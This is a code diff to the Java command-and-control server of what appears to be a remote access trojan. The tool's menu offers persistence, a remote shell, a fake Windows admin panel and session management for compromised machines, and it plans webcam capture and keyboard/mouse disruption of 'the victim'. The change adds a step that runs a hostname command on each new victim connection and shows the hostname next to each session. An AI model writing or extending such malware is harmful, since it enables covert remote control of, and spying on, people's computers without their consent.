@@ -10,6 +10,7 @@ public class Server implements Runnable {
     PrintStream ps;
     OutputStream os;
     ArrayList<Socket> sessions = new ArrayList<Socket>();
+    ArrayList<String> hostnames = new ArrayList<String>();
     public static void main(String[] args) throws Exception {
         Server serv = new Server();
         (new Thread(new SessionListener(serv))).start();
@@ -29,12 +30,12 @@ public class Server implements Runnable {
                     System.out.println("HELP MENU:");
                     System.out.println("\tWORKING - persist - initiate persistance on remote machine");
                     System.out.println("\tWORKING - shell - enter a stateless shell environment");
-                    System.out.println("\tIN PROGRESS - upload - open prompt for uploading a file");
-                    System.out.println("\tIN PROGRESS - download - open prompt for downloading a remote file");
-                    System.out.println("\tIN PROGRESS - screenshot - take a screenshot of the remote machine");
-                    System.out.println("\tIN PROGRESS - webcam - take an image using the victims camera");
-                    System.out.println("\tIN PROGRESS - mousebreak - prevent the victims mouse from moving");
-                    System.out.println("\tIN PROGRESS - keybreak - create issues with the victims keyboard");
+                    //System.out.println("\tIN PROGRESS - upload - open prompt for uploading a file");
+                    //System.out.println("\tIN PROGRESS - download - open prompt for downloading a remote file");
+                    ///System.out.println("\tIN PROGRESS - screenshot - take a screenshot of the remote machine");
+                    //System.out.println("\tIN PROGRESS - webcam - take an image using the victims camera");
+                    //System.out.println("\tIN PROGRESS - mousebreak - prevent the victims mouse from moving");
+                    //System.out.println("\tIN PROGRESS - keybreak - create issues with the victims keyboard");
                     System.out.println("\tWORKING - adminpanel - creates a fake windows admin panel");
                     System.out.println("\tWORKING - sessions - lists sessions");
                     System.out.println("\tWORKING - selectsession - change to a different session");
@@ -58,6 +59,7 @@ public class Server implements Runnable {
                     System.out.println("type -99 to exit environemt");
                     try {
                         ps.println("sh99");
+                        din.readLine();
                         ps.println("echo %username%");
                         String uname = din.readLine();
                         din.readLine();
@@ -77,7 +79,7 @@ public class Server implements Runnable {
                         ps.println("sh-99");
                     } catch (Exception e) {
                         System.out.println("shell connection dropped");
-                        System.out.println("session might be offline");
+                        System.out.println("session might be offline!");
                     }
                 }
                 if (command.equals("upload")) {
@@ -129,7 +131,7 @@ public class Server implements Runnable {
                     try {
                         System.out.println("LISTING SESSIONS:\n");
                         for(int i=0;i<sessions.size();i++) {
-                            System.out.println(i + " - " + sessions.get(i).getInetAddress());
+                            System.out.println(i + " - " + sessions.get(i).getInetAddress() + " - " + hostnames.get(i));
                         }
                     } catch (Exception e) {
                         System.out.println("failed to list sessions");
@@ -145,6 +147,7 @@ public class Server implements Runnable {
                         din = new BufferedReader(new InputStreamReader(s.getInputStream()));
                         System.out.println("now connected to session " + sesnum);
                         System.out.println("connected session IP is " + s.getInetAddress());
+                        System.out.println("connected session HOSTNAME is " + hostnames.get(sesnum));
                     } catch (Exception e) {
                         System.out.println("failed to change session");
                     }
@@ -155,7 +158,23 @@ public class Server implements Runnable {
         }
     }
     public void addSocket(Socket cs) {
-        System.out.println("connection from " + cs.getInetAddress());
-        sessions.add(cs);
+        try {
+            PrintStream tps = new PrintStream(cs.getOutputStream());
+            OutputStream tos = cs.getOutputStream();
+            BufferedReader tdin = new BufferedReader(new InputStreamReader(cs.getInputStream()));
+            tps.println("sh99");
+            tps.println("@echo off");
+            tdin.readLine();
+            tps.println("FOR /F \"usebackq\" %i IN (`hostname`) DO echo %i");
+            tdin.readLine();
+            String hostname = tdin.readLine();
+            hostname = hostname.substring(hostname.indexOf(" ")+1);
+            hostnames.add(hostname);
+            sessions.add(cs);
+            System.out.println("NEW CONNECTION - " + cs.getInetAddress() + " - " + hostname);
+            ps.println("sh-99");
+        } catch (Exception e) {
+            System.out.println("failed to add new socket");
+        }
     }
  }
